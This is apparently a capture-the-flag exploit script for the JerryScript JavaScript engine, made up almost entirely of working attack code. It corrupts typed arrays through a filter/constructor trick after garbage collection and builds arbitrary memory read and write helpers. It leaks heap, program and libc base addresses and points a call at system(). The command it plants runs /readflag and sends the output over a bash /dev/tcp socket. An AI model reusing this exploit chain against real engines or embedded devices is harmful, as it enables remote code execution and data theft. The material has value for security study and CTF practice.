////////
///bin/id; whoami; 
var buf = new ArrayBuffer(8);
var f64v = new Float64Array(buf);
var i64v = new BigInt64Array(buf);


BigInt.prototype.i2f = function() {
	i64v[0] = this;
	return f64v[0];
}
Number.prototype.f2i = function() {
	f64v[0] = this;
	return i64v[0];
}
Number.prototype.hex = function() {
	return "0x" + this.toString(16);
}
BigInt.prototype.hex = function() {
	return "0x" + this.toString(16);
}

/*
var a = new Uint32Array(0x100);
var y = new Float64Array(0x100);
y[0] = 1.1; // mark

a = 0;
gc();
var c = new Uint32Array(0x100);
c[0] = 0x11223344; //mark

print(y);
*/

var area0 = new Uint32Array(0x100);
var area1 = new Float64Array(0x100);
var area2 = new Float64Array(0x100);


var x = [];
for (let i = 0; i < 0x80; i++) {
	x.push({"A":1});
}

var range = 0x80;
for (let i=0;i < range;i++) {
	area2[i] = 1.1;
}
/*
area0 = 0;
var areax = new Uint32Array(0x100);
areax[0] = 0xffeeffee;
x = 0;
gc();
while(1){}
*/
//area2[range] = (0x0077000001610021n).i2f();
area2[range] = (0x0000000000000021n).i2f();
area2[range+1] = (0x00001f0000000117n).i2f();

area2.constructor = Uint32Array;
area0 = 0; // wipe area0
x = 0; // wipe x
gc();
//var area2 = new Float64Array(0x80);
//area2[0] = 3.3;
var area0_overflow = area2.filter(x => x);
print(area1.length.hex());
/*
for (let i = 0x200; i < area1.length; i++){
	print(i);
	if (area1[i] != 0 && area1[i] != undefined) {
		print(area1[i]);
		print(i, area1[i].f2i().hex());
	}
}
*/

var find_heap_leak;
for (let i = 0x200; i < 0x300; i++){
	if (area1[i] != 0 && area1[i] != undefined) {
		let v = area1[i].f2i();
		if (v > 0x500000000000n && v < 0x600000000000n) {
			find_heap_leak = i;
			break;
		}
	}
}
var leak = area1[find_heap_leak].f2i();
//var leak = area1[0x1020/8].f2i();
print("leak:", leak.hex());

//print(area1[0x101].f2i().hex());
area1[0x101] = (0x0000010000010117n).i2f();

function aar(addr) {
	area1[0x102] = (addr).i2f();
	return area2[0].f2i();
}
function aaw(addr, value) {
	area1[0x102] = (addr).i2f();
	aar(addr);
	area2[0] = value.i2f();
}

var find = -1;
var offset = 0x2b80n;
for (let i = 0; i < 0x200; i+=8){
	let value = aar(leak - offset + BigInt(i));
	if (value < 0x2000n && value != 0) {
		let check = aar(leak - offset + BigInt(i)+8n);
		if ((check & 0xffffn) == 0x0070n) {
			find = i;
			break;
		}
	}
}
var jerry_global_heap = leak - offset + BigInt(find);
print("heap base:", jerry_global_heap.hex());
var pie_leak = aar(jerry_global_heap+0x188n);
//var pie = pie_leak - 0x4dff5n;
var pie = pie_leak - 0x4f2e8n;
print("pie_leak:", pie_leak.hex());
print("pie:", pie.hex());

//var got_free = pie + 0x68eb8n;
var got_free = pie + 0x6eeb8n;

var libc_free = aar(got_free);
print("libc_free:", libc_free.hex());
var libc_base = libc_free - 0xa5460n;
print("libc_base:", libc_base.hex());
var libc_system = libc_base + 0x50d60n;

var cmd_addr = jerry_global_heap + 0x1a49n;
var cmd = "bash -c '/readflag > /dev/tcp/127.0.0.1/44444;'";
cmd = cmd.padEnd(0x40, '\0');
//print(area1[0]);
area1[0x102] = (cmd_addr).i2f();
area1[0x103] = (libc_system).i2f();
area1[0x10] = (0xdeadbeefn).i2f();
for (let i = 0; i < 0x40; i+=8) {
	var value = 0n;
	for (let j = 0; j < 8; j++) {
		value |= BigInt(cmd.charCodeAt(i+j)) << BigInt((j*8));
	}
	area1[0x11+i/8] = value.i2f();
}

area2 = 0;
gc();
var xx= new Float64Array(0x80);
while(1) {}
